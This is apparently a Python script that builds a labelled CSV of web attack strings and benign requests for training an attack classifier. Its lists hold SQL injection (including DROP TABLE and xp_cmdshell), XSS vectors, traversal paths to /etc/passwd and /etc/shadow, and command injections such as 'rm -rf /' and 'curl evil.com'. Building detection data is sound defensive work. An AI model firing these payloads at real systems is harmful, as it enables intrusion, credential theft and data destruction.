import random
import pandas as pd

sql = [
    "' OR 1=1 --",
    "' UNION SELECT username,password FROM users --",
    "' DROP TABLE users --",
    "' AND SLEEP(5)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' WAITFOR DELAY '0:0:5'--",
    "admin'--",
    "' OR 'a'='a",
    "' UNION ALL SELECT NULL,NULL--",
    "'; EXEC xp_cmdshell('dir')--",
]

xss = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<script>document.cookie</script>",
    "<a href=javascript:alert(1)>click</a>",
    "<img src=1 onerror=confirm(1)>",
    "<video><source onerror=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script>",
]

traversal = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "../../../../boot.ini",
    "..\\..\\windows\\system32",
    "/../../../../etc/passwd",
    "../../../../../var/log/auth.log",
    "..%2f..%2fetc/passwd",
    "..\\windows\\win.ini",
    "/proc/self/environ",
    "../../config.php",
]

command = [
    "&& whoami",
    "ls -la; cat /etc/passwd",
    "| powershell.exe",
    "; shutdown -h now",
    "&& ipconfig",
    "&& net user",
    "| bash",
    "; rm -rf /",
    "&& curl evil.com",
    "&& ping google.com",
]

benign = [
    "GET /index.html",
    "POST /login",
    "GET /products",
    "username=manideep",
    "search=laptop",
    "contact us",
    "hello world",
    "update profile",
    "download invoice",
    "forgot password",
]

rows = []

def create_samples(payloads, label, count):
    for _ in range(count):
        payload = random.choice(payloads)

        if random.random() > 0.5:
            payload += random.choice([
                "",
                " ",
                "?id=1",
                "&page=2",
                "#test",
                "%20",
                ";",
                " --",
            ])

        rows.append({
            "payload": payload,
            "label": label,
        })

create_samples(sql, "SQL Injection", 300)
create_samples(xss, "Cross Site Scripting", 300)
create_samples(traversal, "Directory Traversal", 300)
create_samples(command, "Command Injection", 300)
create_samples(benign, "Benign", 300)

random.shuffle(rows)

df = pd.DataFrame(rows)

df.to_csv("dataset.csv", index=False)

print("=" * 50)
print("Dataset Generated Successfully")
print("Samples:", len(df))
print(df["label"].value_counts())
print("=" * 50)